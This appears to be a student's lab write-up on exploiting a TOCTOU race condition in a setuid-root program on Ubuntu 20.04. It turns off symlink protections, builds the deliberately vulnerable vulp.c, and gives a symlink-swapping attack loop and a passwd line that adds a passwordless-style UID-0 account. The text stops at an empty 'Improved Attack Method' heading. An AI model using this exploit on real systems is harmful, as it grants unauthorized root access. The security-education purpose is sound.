# Lab 1 - Race Condition

A race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place.

## Turning Off Countermeasures

To turn off race condition protections, in order to guarantee that the attack will be possible. In Ubuntu 20.04:

```bash
$ sudo sysctl -w fs.protected_symlinks=0
$ sudo sysctl fs.protected_regular=0
```

## Writing a vulnerable program

Vulp.c program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);

    if (!access(fn, W_OK)) {        // A
        fp = fopen(fn, "a+");       // B
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }

    return 0;
}
```

Internally, the verification in `A` will be in terms of the **Real UID** (current user ID), and `B` using the **Effective UID** (temporary ID, ). The goal of this attack is to gain root privileges by exploring the race vulnerability. If we change the meaning of the `tmp/XYZ` file between this two instructions (due to non-atomic operations), using for instance UNIX symbolic link (symblink), we could access the `etc/passwd` file content and write stuff.

To compile/run this vulnerable program:

```bash
$ gcc vulp.c -o vulp
$ sudo chown root vulp
$ sudo chmod 4755 vulp
```

## Choosing Our Target

We want to append one more line in `etc/passwd` file:

```note
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```

- "test" will be our new username;
- "U6aMy0wojraho" guarantees that we don't need to fill the password field;
- "0" id, as the third argument, implicitly guarantees root privileges on this new user;

With this line, we can gain access to the machine using a root user.

## The Real Attack

race.c, the attack program:

```c
#include <unistd.h>
int main() {
	while(1) {
		unlink("/tmp/XYZ");
		symlink("/etc/passwd","/tmp/XYZ");
	}
	return 0;
}
```

To run and monitoring the attack, we'll use this bash script:

```bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]          # Check if /etc/passwd is modified
do
    echo "your input" | ./vulp      # Run the vulnerable program
    new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
```

We can run both programs in parallel in order to catch the expected result. 

## Improved Attack Method